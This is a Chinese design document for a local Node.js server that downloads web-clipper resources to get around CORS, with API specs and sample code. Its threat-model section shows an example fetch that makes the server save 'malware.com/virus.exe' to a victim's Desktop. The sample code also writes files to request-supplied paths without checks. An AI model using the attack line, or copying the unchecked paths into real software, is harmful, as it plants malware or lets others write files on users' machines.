# CLI Server 方案：本地 HTTP 服务器解决跨域问题

> 生成时间：2025-12-03
> 方案类型：本地 HTTP 服务 + 浏览器扩展
> 推荐度：⭐⭐⭐⭐⭐

---

## 📋 方案概述

### 核心思路

**启动一个本地 HTTP 服务器，由服务器负责下载资源（绕过 CORS），扩展只负责发送 URL 列表。**

```
┌─────────────────┐
│  浏览器扩展      │
│  ┌───────────┐  │
│  │ 提取 URLs  │  │
│  └─────┬─────┘  │
└────────┼────────┘
         │ HTTP POST
         ↓
┌─────────────────┐
│  CLI Server     │
│ (127.0.0.1:7298)│
│  ┌───────────┐  │
│  │ 下载资源   │  │ ← 无 CORS 限制！
│  └─────┬─────┘  │
│        ↓         │
│  ┌───────────┐  │
│  │保存/上传  │  │
│  └───────────┘  │
└─────────────────┘
```

### 与 Native App 的关键区别

| 特性 | Native App | CLI Server |
|------|-----------|-----------|
| **通信协议** | Native Messaging (stdin/stdout) | HTTP REST API |
| **安装方式** | 复杂（7步，manifest注册） | 简单（1条命令） |
| **启动方式** | 浏览器自动管理 | 用户手动启动 |
| **跨浏览器** | 需为每个浏览器注册 | 一次安装，全部可用 |
| **调试难度** | 难（stdout重定向） | 易（标准HTTP日志） |
| **开发语言** | Ruby（当前） | Node.js/Go（更流行） |
| **版本更新** | 复杂（重新安装） | 简单（npm update） |
| **扩展性** | 低（只能与扩展通信） | 高（可服务多个客户端） |

---

## 🏗️ 架构设计

### 技术栈

**Server 端（推荐 Node.js）**：

```
Node.js + Express
├── express          # HTTP 服务器框架
├── axios            # HTTP 客户端（下载资源）
├── commander        # CLI 参数解析
├── chalk            # 终端美化
├── ora              # 进度指示器
└── qrcode-terminal  # 二维码显示
```

**为什么选 Node.js？**
- ✅ 与扩展同语言（JavaScript）
- ✅ npm 生态丰富，安装简单
- ✅ 开发速度快
- ✅ 社区活跃，易于贡献

**（可选）Go 版本**：
- 静态编译，单文件部署
- 性能更好，内存占用更小
- 适合作为最终发布版本

### 目录结构

```
maoxian-clipper-server/
├── bin/
│   └── cli.js              # CLI 入口
├── src/
│   ├── server.js           # HTTP 服务器主文件
│   ├── downloader.js       # 资源下载器
│   ├── webdav-client.js    # WebDAV 客户端（可选）
│   ├── auth.js             # Token 认证管理
│   └── config.js           # 配置管理
├── package.json
├── README.md
└── LICENSE
```

---

## 🔌 API 设计

### RESTful 端点

**基础 URL**: `http://127.0.0.1:7298`

#### 1. 健康检查

```http
GET /health

Response:
{
  "ok": true,
  "version": "1.0.0",
  "uptime": 3600
}
```

#### 2. 授权页面

```http
GET /authorize

Response: HTML 页面
- 显示 Token
- 显示二维码
- 提供复制按钮
```

#### 3. 下载资源

```http
POST /api/download

Headers:
  Content-Type: application/json
  X-Auth-Token: <token>

Request Body:
{
  "urls": [
    "https://example.com/image1.jpg",
    "https://example.com/image2.png"
  ],
  "saveDir": "/path/to/save",
  "options": {
    "timeout": 30000,
    "userAgent": "...",
    "referer": "...",
    "headers": {}
  }
}

Response:
{
  "ok": true,
  "results": [
    {
      "url": "https://example.com/image1.jpg",
      "ok": true,
      "path": "/path/to/save/image1.jpg",
      "size": 102400,
      "mimeType": "image/jpeg"
    },
    {
      "url": "https://example.com/image2.png",
      "ok": false,
      "error": "Download timeout"
    }
  ]
}
```

#### 4. 下载并上传到 WebDAV

```http
POST /api/download-webdav

Request Body:
{
  "urls": ["..."],
  "webdav": {
    "url": "https://dav.example.com",
    "username": "user",
    "password": "pass",
    "basePath": "/MaoXian/"
  },
  "options": {}
}

Response: 同 /api/download
```

#### 5. 完整剪藏（推荐）

```http
POST /api/clip

Request Body:
{
  "clipId": "2025-12-03-abc123",
  "html": "<html>...</html>",
  "resources": [
    {
      "url": "https://example.com/img.jpg",
      "localPath": "assets/img.jpg"
    }
  ],
  "saveDir": "/path/to/clips",
  "webdav": {  // 可选
    "url": "...",
    "username": "...",
    "password": "..."
  }
}

Response:
{
  "ok": true,
  "clipPath": "/path/to/clips/2025-12-03-abc123",
  "results": [...]
}
```

---

## 🔐 安全设计

### 问题：本地端口攻击

任何网站都可以发送请求到 `127.0.0.1:7298`，这是安全风险！

```javascript
// 恶意网站可以执行：
fetch('http://127.0.0.1:7298/api/download', {
  method: 'POST',
  body: JSON.stringify({
    urls: ['https://malware.com/virus.exe'],
    saveDir: '/Users/victim/Desktop/'
  })
});
```

### 解决方案：Token 认证

**Token 生成和管理**：

```javascript
// src/auth.js
import crypto from 'crypto';

export class AuthManager {
  constructor() {
    // 启动时生成随机 token
    this.token = crypto.randomBytes(32).toString('hex');
  }

  getToken() {
    return this.token;
  }

  verify(token) {
    return token === this.token;
  }
}
```

**服务器端验证**：

```javascript
// 中间件：验证所有 /api/* 请求
app.use('/api/*', (req, res, next) => {
  const token = req.headers['x-auth-token'];

  if (!authManager.verify(token)) {
    return res.status(401).json({
      error: 'Unauthorized',
      message: '请先访问 http://127.0.0.1:7298/authorize 获取 Token'
    });
  }

  next();
});
```

**扩展端使用**：

```javascript
// 扩展发送请求时带上 token
const response = await fetch('http://127.0.0.1:7298/api/download', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Auth-Token': userConfiguredToken  // 用户在设置中配置
  },
  body: JSON.stringify({...})
});
```

### 授权流程设计

```
1. 用户运行：mx-server start --authorize
   ↓
2. Server 生成随机 Token
   ↓
3. 自动打开浏览器到 http://127.0.0.1:7298/authorize
   ↓
4. 页面显示：
   - Token（可复制）
   - 二维码（移动端扫描）
   - "安装扩展"按钮
   ↓
5. 用户复制 Token
   ↓
6. 在扩展设置中粘贴 Token
   ↓
7. 扩展保存 Token 到 storage
   ↓
8. 完成！后续请求都带上这个 Token
```

### CORS 处理

Server 需要允许扩展的跨域请求：

```javascript
import cors from 'cors';

app.use(cors({
  origin: (origin, callback) => {
    // 允许扩展和本地请求
    if (!origin ||
        origin.startsWith('chrome-extension://') ||
        origin.startsWith('moz-extension://') ||
        origin.startsWith('http://127.0.0.1')) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
```

---

## 💻 核心代码实现

### Server 主文件

```javascript
// src/server.js
import express from 'express';
import cors from 'cors';
import { Downloader } from './downloader.js';
import { AuthManager } from './auth.js';

export class ClipperServer {
  constructor(options = {}) {
    this.port = options.port || 7298;
    this.app = express();
    this.authManager = new AuthManager();
    this.downloader = new Downloader();

    this.setupMiddleware();
    this.setupRoutes();
  }

  setupMiddleware() {
    // CORS
    this.app.use(cors({
      origin: (origin, callback) => {
        if (!origin ||
            origin.startsWith('chrome-extension://') ||
            origin.startsWith('moz-extension://')) {
          callback(null, true);
        } else {
          callback(new Error('Not allowed by CORS'));
        }
      }
    }));

    this.app.use(express.json({limit: '50mb'}));

    // 请求日志
    this.app.use((req, res, next) => {
      console.log(`${new Date().toISOString()} ${req.method} ${req.path}`);
      next();
    });
  }

  setupRoutes() {
    // 健康检查（无需认证）
    this.app.get('/health', (req, res) => {
      res.json({
        ok: true,
        version: '1.0.0',
        uptime: process.uptime()
      });
    });

    // 授权页面（无需认证）
    this.app.get('/authorize', (req, res) => {
      const token = this.authManager.getToken();
      res.send(this.getAuthorizePage(token));
    });

    // API 路由（需要认证）
    this.app.use('/api/*', this.authMiddleware.bind(this));
    this.app.post('/api/download', this.handleDownload.bind(this));
    this.app.post('/api/clip', this.handleClip.bind(this));
  }

  authMiddleware(req, res, next) {
    const token = req.headers['x-auth-token'];

    if (!this.authManager.verify(token)) {
      return res.status(401).json({
        error: 'Unauthorized',
        message: `请访问 http://127.0.0.1:${this.port}/authorize`
      });
    }

    next();
  }

  async handleDownload(req, res) {
    const {urls, saveDir, options = {}} = req.body;

    if (!Array.isArray(urls) || urls.length === 0) {
      return res.status(400).json({
        error: 'Invalid request',
        message: 'urls must be a non-empty array'
      });
    }

    try {
      const results = await this.downloader.downloadAll(urls, saveDir, options);
      res.json({ok: true, results});
    } catch (error) {
      res.status(500).json({
        ok: false,
        error: error.message
      });
    }
  }

  async handleClip(req, res) {
    const {clipId, html, resources, saveDir, webdav} = req.body;

    try {
      // 1. 创建剪藏目录
      const clipPath = path.join(saveDir, clipId);
      await fs.mkdir(clipPath, {recursive: true});

      // 2. 保存 HTML
      const htmlPath = path.join(clipPath, 'index.html');
      await fs.writeFile(htmlPath, html);

      // 3. 下载资源
      const assetDir = path.join(clipPath, 'assets');
      await fs.mkdir(assetDir, {recursive: true});

      const downloadUrls = resources.map(r => r.url);
      const results = await this.downloader.downloadAll(downloadUrls, assetDir);

      // 4. 可选：上传到 WebDAV
      if (webdav) {
        // TODO: WebDAV 上传
      }

      res.json({
        ok: true,
        clipPath,
        results
      });

    } catch (error) {
      res.status(500).json({
        ok: false,
        error: error.message
      });
    }
  }

  getAuthorizePage(token) {
    return `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <title>MaoXian Clipper Server - 授权</title>
        <style>
          body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
          }
          .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
          }
          h1 { color: #333; }
          .token-box {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            word-break: break-all;
            margin: 20px 0;
          }
          button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-right: 10px;
          }
          button:hover { background: #45a049; }
          .qrcode {
            text-align: center;
            margin: 20px 0;
          }
          .steps {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
          }
          .steps ol { margin: 10px 0; padding-left: 25px; }
          .steps li { margin: 8px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>🔐 授权 Clipper Server</h1>
          <p>将以下 Token 复制到浏览器扩展设置中：</p>

          <div class="token-box" id="token">${token}</div>

          <button onclick="copyToken()">📋 复制 Token</button>
          <button onclick="window.close()">✅ 完成</button>

          <div class="qrcode">
            <p>或扫描二维码（移动端）：</p>
            <canvas id="qrcode"></canvas>
          </div>

          <div class="steps">
            <strong>📝 配置步骤：</strong>
            <ol>
              <li>复制上面的 Token</li>
              <li>打开扩展设置页面</li>
              <li>选择 "Server" 作为存储方式</li>
              <li>粘贴 Token 并保存</li>
            </ol>
          </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
        <script>
          const token = '${token}';

          function copyToken() {
            navigator.clipboard.writeText(token).then(() => {
              alert('✅ Token 已复制到剪贴板');
            });
          }

          // 生成二维码
          QRCode.toCanvas(
            document.getElementById('qrcode'),
            JSON.stringify({
              type: 'mx-server-auth',
              token: token,
              host: 'http://127.0.0.1:${this.port}'
            }),
            { width: 200 }
          );
        </script>
      </body>
      </html>
    `;
  }

  async start() {
    return new Promise((resolve) => {
      this.server = this.app.listen(this.port, '127.0.0.1', () => {
        console.log(`✅ Clipper Server 已启动`);
        console.log(`📍 地址：http://127.0.0.1:${this.port}`);
        console.log(`🔑 Token：${this.authManager.getToken()}`);
        console.log(`🔗 授权：http://127.0.0.1:${this.port}/authorize`);
        resolve();
      });
    });
  }

  async stop() {
    return new Promise((resolve) => {
      if (this.server) {
        this.server.close(resolve);
      } else {
        resolve();
      }
    });
  }
}
```

### 资源下载器

```javascript
// src/downloader.js
import axios from 'axios';
import fs from 'fs/promises';
import path from 'path';
import { createWriteStream } from 'fs';
import { pipeline } from 'stream/promises';

export class Downloader {
  constructor(options = {}) {
    this.maxConcurrency = options.maxConcurrency || 3;
    this.timeout = options.timeout || 30000;
  }

  async downloadAll(urls, saveDir, options = {}) {
    // 确保目录存在
    await fs.mkdir(saveDir, {recursive: true});

    // 并发控制
    const results = [];
    const queue = [...urls];
    const running = new Set();

    while (queue.length > 0 || running.size > 0) {
      // 启动新任务
      while (running.size < this.maxConcurrency && queue.length > 0) {
        const url = queue.shift();
        const promise = this.downloadOne(url, saveDir, options)
          .then(result => {
            results.push(result);
            running.delete(promise);
          })
          .catch(error => {
            results.push({
              url,
              ok: false,
              error: error.message
            });
            running.delete(promise);
          });

        running.add(promise);
      }

      // 等待至少一个完成
      if (running.size > 0) {
        await Promise.race(running);
      }
    }

    return results;
  }

  async downloadOne(url, saveDir, options = {}) {
    const filename = options.filename || this.extractFilename(url);
    const filepath = path.join(saveDir, filename);

    try {
      const response = await axios({
        method: 'get',
        url: url,
        responseType: 'stream',
        timeout: options.timeout || this.timeout,
        headers: {
          'User-Agent': options.userAgent ||
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
          'Referer': options.referer || url,
          ...options.headers
        }
      });

      // 流式写入
      await pipeline(
        response.data,
        createWriteStream(filepath)
      );

      const stats = await fs.stat(filepath);

      return {
        url,
        ok: true,
        path: filepath,
        filename,
        size: stats.size,
        mimeType: response.headers['content-type']
      };

    } catch (error) {
      throw new Error(`下载失败: ${error.message}`);
    }
  }

  extractFilename(url) {
    const urlObj = new URL(url);
    const pathname = urlObj.pathname;
    let filename = path.basename(pathname);

    // 如果没有扩展名，根据 MIME 类型添加
    if (!path.extname(filename)) {
      filename += '.bin';
    }

    return filename;
  }
}
```

### CLI 入口

```javascript
#!/usr/bin/env node
// bin/cli.js
import { Command } from 'commander';
import chalk from 'chalk';
import ora from 'ora';
import open from 'open';
import { ClipperServer } from '../src/server.js';

const program = new Command();

program
  .name('mx-server')
  .description('MaoXian Web Clipper 本地服务器')
  .version('1.0.0');

program
  .command('start')
  .description('启动服务器')
  .option('-p, --port <port>', '端口号', '7298')
  .option('-a, --authorize', '自动打开授权页面')
  .action(async (options) => {
    const spinner = ora('正在启动服务器...').start();

    try {
      const server = new ClipperServer({
        port: parseInt(options.port)
      });

      await server.start();
      spinner.succeed(chalk.green('服务器已启动'));

      if (options.authorize) {
        const url = `http://127.0.0.1:${options.port}/authorize`;
        await open(url);
        console.log(chalk.blue(`已打开授权页面: ${url}`));
      }

      // 监听退出信号
      process.on('SIGINT', async () => {
        console.log(chalk.yellow('\n正在关闭服务器...'));
        await server.stop();
        console.log(chalk.green('服务器已关闭'));
        process.exit(0);
      });

    } catch (error) {
      spinner.fail(chalk.red('启动失败'));
      console.error(chalk.red(error.message));
      process.exit(1);
    }
  });

program
  .command('status')
  .description('查看服务器状态')
  .action(async () => {
    try {
      const response = await fetch('http://127.0.0.1:7298/health');
      const data = await response.json();

      console.log(chalk.green('✅ 服务器正在运行'));
      console.log(chalk.gray(`   版本: ${data.version}`));
      console.log(chalk.gray(`   运行时间: ${Math.floor(data.uptime)}秒`));
    } catch (error) {
      console.log(chalk.red('❌ 服务器未运行'));
    }
  });

program.parse();
```

---

## 🔧 扩展端集成

### Server Handler

```javascript
// src/js/handler/server.js
import T from '../lib/tool.js';
import MxWcConfig from '../lib/config.js';
import SavingTool from '../saving/new-saving-tool.js';

class ClippingHandler_Server {
  constructor() {
    this.name = 'Server';
    this.serverUrl = 'http://127.0.0.1:7298';
    this.token = null;
  }

  async init(global) {
    Global = global;
    const config = await MxWcConfig.load();
    this.token = config.serverToken;
    this.serverUrl = config.serverUrl || this.serverUrl;
  }

  async getInfo() {
    try {
      const response = await fetch(`${this.serverUrl}/health`);
      const data = await response.json();

      if (!this.token) {
        return {
          ready: false,
          message: '请先配置 Server Token <a href="/settings.html">前往设置</a>'
        };
      }

      return {
        ready: true,
        version: data.version,
        supportFormats: ['html', 'md']
      };

    } catch (error) {
      return {
        ready: false,
        message: 'Server 未运行<br>请执行: <code>mx-server start</code>'
      };
    }
  }

  async saveClipping(clipping, feedback) {
    const savingTool = new SavingTool.SaveClipping(clipping, feedback, {
      mode: SavingTool.SaveClipping.MODE.COMPLETE_WHEN_ALL_TASK_FINISHED
    });

    try {
      // 准备请求数据
      const mainTask = clipping.tasks.find(t => t.taskType === 'mainFileTask');
      const assetTasks = clipping.tasks.filter(t => t.taskType !== 'mainFileTask');

      const requestBody = {
        clipId: clipping.info.clipId,
        html: mainTask?.content || mainTask?.text,
        resources: assetTasks.map(t => ({
          url: t.url,
          filename: t.filename,
          headers: t.requestParams || {}
        })),
        saveDir: await this.getSaveDir()
      };

      // 发送到 server
      const response = await fetch(`${this.serverUrl}/api/clip`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Token': this.token
        },
        body: JSON.stringify(requestBody)
      });

      const result = await response.json();

      if (!result.ok) {
        throw new Error(result.error || 'Server 返回错误');
      }

      // 标记任务完成
      if (mainTask) {
        savingTool.taskCompleted(mainTask, {
          fullFilename: `${result.clipPath}/index.html`
        });
      }

      result.results.forEach(r => {
        const task = assetTasks.find(t => t.url === r.url);
        if (task) {
          if (r.ok) {
            savingTool.taskCompleted(task, {
              fullFilename: r.path
            });
          } else {
            savingTool.taskFailed(task, r.error);
          }
        }
      });

    } catch (error) {
      // 标记所有任务失败
      clipping.tasks.forEach(task => {
        savingTool.taskFailed(task, error.message);
      });
    }
  }

  async getSaveDir() {
    const config = await MxWcConfig.load();
    return config.rootFolder;
  }

  handleClippingResult(result) {
    // 生成本地文件 URL
    result.url = T.toFileUrl(result.filename);
    return result;
  }
}

let Global = null;

export default Object.assign({name: 'Server'}, {
  init: ClippingHandler_Server.prototype.init,
  getInfo: ClippingHandler_Server.prototype.getInfo,
  saveClipping: ClippingHandler_Server.prototype.saveClipping,
  handleClippingResult: ClippingHandler_Server.prototype.handleClippingResult
});
```

### 配置界面

```html
<!-- settings.html 中添加 Server 配置区域 -->
<section class="config-section" id="serverConfig">
  <h2>Server 配置</h2>

  <div class="form-group">
    <label>Server 状态</label>
    <div class="status-display">
      <span class="status-indicator" id="serverStatusIndicator"></span>
      <span class="status-text" id="serverStatusText">检查中...</span>
      <button onclick="checkServerStatus()" class="btn-secondary">刷新</button>
    </div>
  </div>

  <div class="form-group">
    <label for="serverUrl">Server 地址</label>
    <input
      type="url"
      id="serverUrl"
      value="http://127.0.0.1:7298"
      placeholder="http://127.0.0.1:7298"
    />
    <small class="help-text">通常不需要修改</small>
  </div>

  <div class="form-group">
    <label for="serverToken">认证 Token</label>
    <div class="input-with-button">
      <input
        type="password"
        id="serverToken"
        placeholder="请从授权页面获取"
      />
      <button onclick="openAuthorizePage()" class="btn-primary">
        获取 Token
      </button>
    </div>
  </div>

  <div class="help-box">
    <h4>📖 如何使用 Server？</h4>
    <ol>
      <li>
        <strong>安装：</strong>
        <code>npm install -g maoxian-clipper-server</code>
      </li>
      <li>
        <strong>启动：</strong>
        <code>mx-server start --authorize</code>
      </li>
      <li>
        在打开的页面中复制 Token
      </li>
      <li>
        粘贴到上方输入框并保存
      </li>
    </ol>
    <p>
      <a href="https://github.com/maoxian/clipper-server" target="_blank">
        查看完整文档 →
      </a>
    </p>
  </div>
</section>

<style>
.status-display {
  display: flex;
  align-items: center;
  gap: 10px;
}

.status-indicator {
  display: inline-block;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  background: #ccc;
}

.status-indicator.online {
  background: #4CAF50;
  box-shadow: 0 0 8px #4CAF50;
}

.status-indicator.offline {
  background: #f44336;
}

.input-with-button {
  display: flex;
  gap: 10px;
}

.input-with-button input {
  flex: 1;
}

.help-box {
  background: #e3f2fd;
  padding: 15px;
  border-radius: 5px;
  margin-top: 15px;
}

.help-box h4 {
  margin-top: 0;
}

.help-box code {
  background: #fff;
  padding: 2px 6px;
  border-radius: 3px;
  font-size: 13px;
}
</style>

<script>
async function checkServerStatus() {
  const serverUrl = document.getElementById('serverUrl').value;
  const indicator = document.getElementById('serverStatusIndicator');
  const statusText = document.getElementById('serverStatusText');

  indicator.className = 'status-indicator';
  statusText.textContent = '检查中...';

  try {
    const response = await fetch(`${serverUrl}/health`);
    const data = await response.json();

    indicator.className = 'status-indicator online';
    statusText.textContent = `运行中 (v${data.version})`;
  } catch (error) {
    indicator.className = 'status-indicator offline';
    statusText.textContent = '未运行';
  }
}

function openAuthorizePage() {
  const serverUrl = document.getElementById('serverUrl').value;
  window.open(`${serverUrl}/authorize`, '_blank');
}

// 页面加载时检查
document.addEventListener('DOMContentLoaded', checkServerStatus);

// 定期检查（每30秒）
setInterval(checkServerStatus, 30000);
</script>
```

---

## 📦 发布和分发

### npm 发布

```json
// package.json
{
  "name": "maoxian-clipper-server",
  "version": "1.0.0",
  "description": "Local HTTP server for MaoXian Web Clipper to bypass CORS",
  "bin": {
    "mx-server": "./bin/cli.js"
  },
  "type": "module",
  "keywords": [
    "maoxian",
    "web-clipper",
    "cors",
    "download"
  ],
  "author": "MaoXian Team",
  "license": "MIT",
  "engines": {
    "node": ">=16.0.0"
  },
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5",
    "axios": "^1.6.0",
    "commander": "^11.0.0",
    "chalk": "^5.3.0",
    "ora": "^7.0.1",
    "open": "^9.1.0",
    "qrcode": "^1.5.3"
  }
}
```

### 发布步骤

```bash
# 1. 测试
npm test

# 2. 本地链接测试
npm link
mx-server start

# 3. 发布到 npm
npm login
npm publish

# 用户安装
npm install -g maoxian-clipper-server
```

### 自动更新提示

```javascript
// 在 server 启动时检查版本
async function checkUpdate() {
  try {
    const response = await fetch('https://registry.npmjs.org/maoxian-clipper-server/latest');
    const data = await response.json();
    const latestVersion = data.version;
    const currentVersion = '1.0.0';  // 从 package.json 读取

    if (latestVersion !== currentVersion) {
      console.log(chalk.yellow(`\n⚠️  新版本可用: ${latestVersion}`));
      console.log(chalk.gray(`   当前版本: ${currentVersion}`));
      console.log(chalk.gray(`   更新命令: npm update -g maoxian-clipper-server\n`));
    }
  } catch (error) {
    // 忽略错误
  }
}
```

---

## 📊 方案对比总结

| 维度 | Native App | CLI Server | 胜出 |
|------|-----------|-----------|------|
| **安装难度** | ⭐⭐ (7步，10分钟) | ⭐⭐⭐⭐⭐ (1条命令) | Server |
| **跨浏览器** | ⭐⭐ (需每个注册) | ⭐⭐⭐⭐⭐ (通用) | Server |
| **调试便利性** | ⭐⭐ (日志难获取) | ⭐⭐⭐⭐⭐ (HTTP日志) | Server |
| **开发难度** | ⭐⭐⭐ (Ruby) | ⭐⭐⭐⭐ (Node.js) | Server |
| **用户感知** | ⭐⭐⭐⭐⭐ (透明) | ⭐⭐⭐ (需手动启动) | Native App |
| **版本更新** | ⭐⭐ (重新安装) | ⭐⭐⭐⭐⭐ (npm update) | Server |
| **安全性** | ⭐⭐⭐⭐⭐ (浏览器管理) | ⭐⭐⭐⭐ (Token认证) | Native App |
| **扩展性** | ⭐⭐ (仅扩展) | ⭐⭐⭐⭐⭐ (多客户端) | Server |

**综合评分**：
- CLI Server: ⭐⭐⭐⭐⭐ (35/40)
- Native App: ⭐⭐⭐⭐ (27/40)

---

## 🚀 实施建议

### 开发路线图

**阶段 0：准备（3天）**
- [x] 分析现有代码架构
- [x] 设计 API 接口
- [x] 评估安全性方案

**阶段 1：Server 核心功能（1周）**
- [ ] 实现 Express 服务器
- [ ] 实现 Token 认证
- [ ] 实现资源下载器
- [ ] 实现授权页面

**阶段 2：扩展集成（1周）**
- [ ] 实现 Server Handler
- [ ] 实现配置界面
- [ ] 集成到现有代码
- [ ] 测试基本流程

**阶段 3：优化和发布（1周）**
- [ ] 性能优化（并发控制）
- [ ] 错误处理完善
- [ ] 编写文档和示例
- [ ] 发布到 npm

**阶段 4：进阶功能（可选）**
- [ ] WebDAV 集成
- [ ] WebSocket 进度推送
- [ ] 系统服务（开机启动）
- [ ] GUI 版本（Electron）

### 潜在扩展

**1. 系统服务安装**

```bash
# macOS (launchd)
mx-server install-service

# Linux (systemd)
mx-server install-service

# Windows (NSSM)
mx-server install-service
```

**2. GUI 版本**

使用 Electron 封装，提供图形界面：
- 一键启动/停止
- 可视化配置
- 日志查看
- 系统托盘图标

**3. 移动端支持**

通过 HTTP API，移动端浏览器也能使用：
```javascript
// 移动端浏览器中的 Bookmarklet
javascript:(function(){
  fetch('http://192.168.1.100:7298/api/clip', {
    method: 'POST',
    body: JSON.stringify({...})
  });
})();
```

**4. 云端模式**

部署到云服务器，提供公网访问：
```
用户 → HTTPS API (云端) → 下载资源 → 上传到用户的 WebDAV
```

---

## ✅ 优势总结

### 对用户

1. **安装简单**：一条命令搞定
2. **跨浏览器**：Chrome/Firefox/Edge 通用
3. **易于理解**：HTTP API，概念清晰
4. **灵活配置**：可以选择本地保存或 WebDAV

### 对开发者

1. **开发效率高**：Node.js 生态丰富
2. **调试方便**：标准 HTTP 日志
3. **易于测试**：curl/Postman 测试
4. **扩展性强**：可以添加任意功能

### 对项目

1. **降低维护成本**：比 Native App 简单
2. **提升竞争力**：更好的用户体验
3. **社区友好**：更多开发者能贡献
4. **未来可期**：可扩展为云服务

---

## 🎯 最终推荐

**强烈推荐采用 CLI Server 方案！**

**推荐原因**：
1. ✅ 比 Native App 简单太多（安装、调试、维护）
2. ✅ 完全解决 CORS 问题
3. ✅ 用户体验更好（跨浏览器、易更新）
4. ✅ 开发效率更高（Node.js 生态）
5. ✅ 扩展性更强（可演化为云服务）

**唯一劣势**：需要手动启动 → **可通过系统服务解决**

**实施时间**：3-4 周可完成基础版本

**长期价值**：为未来的云同步、移动端支持奠定基础

---

## 📚 参考资源

- [Express.js 文档](https://expressjs.com/)
- [Node.js HTTP 客户端最佳实践](https://nodejs.org/api/http.html)
- [Chrome 扩展 CORS 指南](https://developer.chrome.com/docs/extensions/mv3/xhr/)
- [Token 认证安全最佳实践](https://owasp.org/www-community/controls/Authentication_Cheat_Sheet)

---

*本文档详细分析了 CLI Server 方案的架构、实现、安全性和优势，提供了完整的代码示例和实施路线图。*
